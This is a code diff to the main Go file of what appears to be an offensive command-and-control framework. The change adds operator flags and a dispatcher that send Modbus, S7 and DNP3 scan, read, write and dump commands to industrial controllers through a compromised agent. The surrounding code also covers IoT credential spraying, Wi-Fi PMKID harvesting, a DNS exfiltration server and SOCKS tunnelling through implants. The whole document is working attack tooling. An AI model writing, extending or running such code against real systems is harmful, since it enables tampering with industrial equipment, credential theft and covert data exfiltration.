@@ -8,6 +8,7 @@ import (
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/json"
+	"errors"
 	"flag"
 	"fmt"
 	"log"
@@ -21,19 +22,19 @@ import (
 
 	tea "github.com/charmbracelet/bubbletea"
 
+	"github.com/sk666G/red-sky---arsenal/internal/capturer"
 	"github.com/sk666G/red-sky---arsenal/internal/crypto"
+	"github.com/sk666G/red-sky---arsenal/internal/dnsexfil"
 	"github.com/sk666G/red-sky---arsenal/internal/planner"
 	"github.com/sk666G/red-sky---arsenal/internal/plugin"
 	"github.com/sk666G/red-sky---arsenal/internal/proto"
 	"github.com/sk666G/red-sky---arsenal/internal/scanner"
 	"github.com/sk666G/red-sky---arsenal/internal/session"
 	rsTLS "github.com/sk666G/red-sky---arsenal/internal/tls"
-	"github.com/sk666G/red-sky---arsenal/internal/capturer"
-	"github.com/sk666G/red-sky---arsenal/internal/dnsexfil"
-	"github.com/sk666G/red-sky---arsenal/internal/tunnel"
 	"github.com/sk666G/red-sky---arsenal/internal/tui"
-	"github.com/sk666G/red-sky---arsenal/internal/wireless"
+	"github.com/sk666G/red-sky---arsenal/internal/tunnel"
 	"github.com/sk666G/red-sky---arsenal/internal/wire"
+	"github.com/sk666G/red-sky---arsenal/internal/wireless"
 )
 
 func main() {
@@ -79,6 +80,20 @@ func main() {
 	iotCredsPath := flag.String("iotcreds-path", "/", "iot spray: HTTP request path")
 	iotCredsTimeout := flag.Int("iotcreds-timeout", 6, "iot spray: per-attempt timeout (seconds)")
 	iotCredsFirst := flag.Bool("iotcreds-first", false, "iot spray: stop after first hit per host")
+	icsHost := flag.String("ics", "", "ics operation: target ip[:port]")
+	icsProto := flag.String("ics-proto", "modbus", "ics protocol: modbus|s7|dnp3")
+	icsAction := flag.String("ics-action", "info", "ics action: scan|read|write|dump|info|integrity|poll")
+	icsUnit := flag.Uint("ics-unit", 1, "modbus unit id")
+	icsFunc := flag.Uint("ics-func", 3, "modbus function code (0x01-0x10)")
+	icsStart := flag.Uint("ics-start", 0, "start address / register / db byte offset")
+	icsCount := flag.Uint("ics-count", 16, "read count")
+	icsValue := flag.Uint("ics-value", 0, "single-register write value")
+	icsArea := flag.Uint("ics-area", 0x83, "s7 area (0x81 input, 0x82 output, 0x83 merker, 0x84 db)")
+	icsDB := flag.Uint("ics-db", 1, "s7 db number")
+	icsData := flag.String("ics-data", "", "hex bytes to write (s7 write, modbus multi-reg not yet)")
+	icsDest := flag.Uint("ics-dest", 1, "dnp3 outstation address")
+	icsSrc := flag.Uint("ics-src", 100, "dnp3 master address")
+	icsClass := flag.Uint("ics-class", 0, "dnp3 class 0..3")
 	pmkidIface := flag.String("pmkid", "", "802.11 PMKID harvest: monitor-mode iface")
 	pmkidChannel := flag.Int("pmkid-channel", 0, "PMKID: set wifi channel before harvest")
 	pmkidDuration := flag.Duration("pmkid-duration", 60*time.Second, "PMKID: total harvest run time")
@@ -307,6 +322,43 @@ func main() {
 		})
 	}
 
+	// ics dispatch — ICS protocol operations via the first agent
+	if *icsHost != "" {
+		host := *icsHost
+		port := 0
+		if i := strings.LastIndex(host, ":"); i > 0 {
+			if p, err := strconv.Atoi(host[i+1:]); err == nil {
+				port = p
+				host = host[:i]
+			}
+		}
+		var dataBytes []byte
+		if *icsData != "" {
+			if b, err := hexDecode(*icsData); err == nil {
+				dataBytes = b
+			} else {
+				log.Printf("[ics] bad -ics-data hex: %v", err)
+			}
+		}
+		go runIcsDispatch(mgr, icsArgs{
+			Host:   host,
+			Port:   port,
+			Proto:  *icsProto,
+			Action: *icsAction,
+			Unit:   uint8(*icsUnit),
+			Func:   byte(*icsFunc),
+			Start:  uint16(*icsStart),
+			Count:  uint16(*icsCount),
+			Value:  uint16(*icsValue),
+			Area:   byte(*icsArea),
+			DB:     uint16(*icsDB),
+			Data:   dataBytes,
+			Dest:   uint16(*icsDest),
+			Src:    uint16(*icsSrc),
+			Class:  uint8(*icsClass),
+		})
+	}
+
 	if *dnsBind != "" {
 		r := dnsexfil.DefaultReassembler()
 		srv := &dnsexfil.Server{Bind: *dnsBind, Domain: *dnsDomain, Reasm: r}
@@ -478,7 +530,6 @@ func handleConn(conn net.Conn, mgr *session.Manager) {
 	mgr.Register(beacon.AgentID, beacon.Info, conn, cs)
 }
 
-
 // runScanner is the fast Go port scanner (Phase 6 + discovery).
 func runScanner(cidr, ports string, threads int, timeout time.Duration) {
 	allHosts, err := scanner.ParseCIDR(cidr)
@@ -539,7 +590,6 @@ func runScanner(cidr, ports string, threads int, timeout time.Duration) {
 	}
 }
 
-
 // startSocks waits for an agent to connect, then starts a SOCKS5 listener
 // that tunnels every connection through it.
 func startSocks(bind string, mgr *session.Manager) {
@@ -559,7 +609,6 @@ func startSocks(bind string, mgr *session.Manager) {
 		time.Sleep(500 * time.Millisecond)
 	}
 }
-
 
 // runPCAPCapture waits for an agent, opens a capture session, and writes
 // received frames to a .pcap file on the core.
@@ -629,7 +678,6 @@ func runPCAPCapture(mgr *session.Manager, iface, outPath string, duration time.D
 		}
 	}
 }
-
 
 // runWirelessCapture waits for an agent, opens a wireless capture session,
 // and writes received 802.11 frames to a .pcap file on the core.
@@ -762,3 +810,74 @@ func runIoTCredsDispatch(mgr *session.Manager, a iotCredsArgs) {
 	}
 }
 
+// icsArgs carries the operator's -ics flags to the dispatcher.
+type icsArgs struct {
+	Host   string
+	Port   int
+	Proto  string
+	Action string
+	Unit   uint8
+	Func   byte
+	Start  uint16
+	Count  uint16
+	Value  uint16
+	Area   byte
+	DB     uint16
+	Data   []byte
+	Dest   uint16
+	Src    uint16
+	Class  uint8
+}
+
+// runIcsDispatch waits for the first agent, then fires an IcsStart over
+// the existing tunnel. Results stream back as IcsData events.
+func runIcsDispatch(mgr *session.Manager, a icsArgs) {
+	for len(mgr.Sessions()) == 0 {
+		time.Sleep(500 * time.Millisecond)
+	}
+	s := mgr.Sessions()[0]
+	sessionID := fmt.Sprintf("ics-%d", time.Now().UnixNano())
+
+	log.Printf("[ics] %s:%d %s/%s -> %s", a.Host, a.Port, a.Proto, a.Action, s.AgentID)
+
+	req := proto.IcsStart{
+		SessionID: sessionID,
+		Protocol:  a.Proto,
+		Host:      a.Host,
+		Port:      a.Port,
+		Action:    a.Action,
+		Unit:      a.Unit,
+		Func:      a.Func,
+		Start:     a.Start,
+		Count:     a.Count,
+		Value:     a.Value,
+		Area:      a.Area,
+		DB:        a.DB,
+		Data:      a.Data,
+		Dest:      a.Dest,
+		Src:       a.Src,
+		Class:     a.Class,
+	}
+	if err := s.SendIcsStart(sessionID, req); err != nil {
+		log.Printf("[ics] start: %v", err)
+	}
+}
+
+// hexDecode is a small helper so we do not have to import encoding/hex
+// if the core file does not already.
+func hexDecode(s string) ([]byte, error) {
+	s = strings.ReplaceAll(s, " ", "")
+	s = strings.ReplaceAll(s, ":", "")
+	if len(s)%2 != 0 {
+		return nil, errors.New("odd-length hex")
+	}
+	out := make([]byte, len(s)/2)
+	for i := 0; i < len(out); i++ {
+		b, err := strconv.ParseUint(s[i*2:i*2+2], 16, 8)
+		if err != nil {
+			return nil, err
+		}
+		out[i] = byte(b)
+	}
+	return out, nil
+}
